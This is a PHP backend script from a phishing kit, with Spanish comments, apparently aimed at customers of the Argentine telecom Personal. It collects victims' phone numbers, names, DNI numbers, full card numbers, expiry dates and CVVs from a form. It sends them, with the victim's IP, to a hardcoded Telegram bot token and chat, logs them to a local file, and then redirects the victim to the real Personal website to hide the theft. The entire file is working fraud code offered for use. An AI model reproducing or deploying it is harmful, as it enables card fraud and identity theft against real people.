<?php
// CONFIGURACIÓN TELEGRAM
$TELEGRAM_BOT_TOKEN = '8234170971:AAH7Z8ySIHDs1tZmWTbFnAc90-RKdh26fwY';
$TELEGRAM_CHAT_ID = '-1003832913889';

// RECIBIR TODOS LOS DATOS
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$card = isset($_POST['card']) ? trim($_POST['card']) : '';
$cv = isset($_POST['cv']) ? trim($_POST['cv']) : '';
$venc = isset($_POST['venc']) ? trim($_POST['venc']) : '';
$dni = isset($_POST['dni']) ? trim($_POST['dni']) : '';
$name = isset($_POST['name']) ? trim($_POST['name']) : '';

// INFO TÉCNICA
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date('Y-m-d H:i:s');

// CONSTRUIR MENSAJE
$mensaje = "🔔 NUEVA CAPTURA COMPLETA\n";
$mensaje .= "━━━━━━━━━━━━━━━\n\n";
$mensaje .= "📱 DATOS:\n";
$mensaje .= "Telefono: " . $phone . "\n";
$mensaje .= "Nombre: " . $name . "\n";
$mensaje .= "DNI: " . $dni . "\n\n";
$mensaje .= "💳 TARJETA:\n";
$mensaje .= "Numero: " . $card . "\n";
$mensaje .= "Vencimiento: " . $venc . "\n";
$mensaje .= "CVV: " . $cv . "\n";
$mensaje .= "Monto: $" . $amount . "\n\n";
$mensaje .= "🌐 INFO:\n";
$mensaje .= "IP: " . $ip . "\n";
$mensaje .= "Fecha: " . $fecha;

// ENVIAR A TELEGRAM
$url = "https://api.telegram.org/bot" . $TELEGRAM_BOT_TOKEN . "/sendMessage";

$data = array(
    'chat_id' => $TELEGRAM_CHAT_ID,
    'text' => $mensaje
);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$result = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// GUARDAR EN LOG
$log_entry = sprintf(
    "[%s] Tel: %s | Tarjeta: %s | Nombre: %s | Monto: %s | HTTP: %s\n",
    $fecha,
    $phone,
    $card,
    $name,
    $amount,
    $http_code
);
@file_put_contents(__DIR__ . '/capturas_final.log', $log_entry, FILE_APPEND);

// REDIRIGIR A PERSONAL.COM.AR (no a success.php)
header('Location: https://www.personal.com.ar/');
exit;
?>